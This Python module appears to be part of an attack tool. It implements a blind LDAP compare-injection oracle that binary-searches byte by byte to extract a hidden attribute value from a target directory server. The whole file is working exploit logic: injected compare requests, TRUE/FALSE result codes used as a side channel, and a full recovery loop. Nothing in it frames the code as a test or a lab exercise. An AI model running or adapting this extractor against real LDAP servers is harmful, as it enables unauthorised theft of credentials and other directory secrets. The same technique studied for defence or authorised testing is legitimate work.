
from __future__ import annotations

from typing import Callable, Optional

from . import inject
from .ldap import RES_COMPARE_FALSE, RES_COMPARE_TRUE, LdapClient, LdapError

class OracleError(Exception):
    pass

class CompareOracle:

    def __init__(self, ldap: LdapClient, dn: str, attribute: str) -> None:
        self.ldap = ldap
        self.dn = dn
        self.attribute = attribute
        self.queries = 0

    def ge(self, candidate: bytes) -> bool:
        attr, value = inject.compare_ge(self.attribute, candidate)
        self.queries += 1
        try:
            code = self.ldap.compare(self.dn, attr, value)
        except LdapError as exc:
            raise OracleError(
                f"server rejected injected compare (attribute={self.attribute!r}): {exc}"
            ) from exc
        if code == RES_COMPARE_TRUE:
            return True
        if code == RES_COMPARE_FALSE:
            return False
        raise OracleError(f"unexpected compare result code {code}")

    def has_more(self, prefix: bytes) -> bool:
        return self.ge(prefix + b"\x00")

    def recover_byte(self, prefix: bytes) -> int:
        if not self.ge(prefix + b"\x01"):
            return 0x00
        lo, hi = 1, 0xFF
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.ge(prefix + bytes([mid])):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def recover(
        self,
        length: Optional[int] = None,
        on_progress: Optional[Callable[[int, int], None]] = None,
    ) -> bytes:
        out = bytearray()
        while True:
            if length is not None:
                if len(out) >= length:
                    break
            else:
                if not self.has_more(bytes(out)):
                    break
            b = self.recover_byte(bytes(out))
            out.append(b)
            if on_progress is not None:
                on_progress(len(out), b)
        if length is not None and len(out) != length:
            raise OracleError(
                f"recovered only {len(out)} bytes, expected {length}"
            )
        return bytes(out)
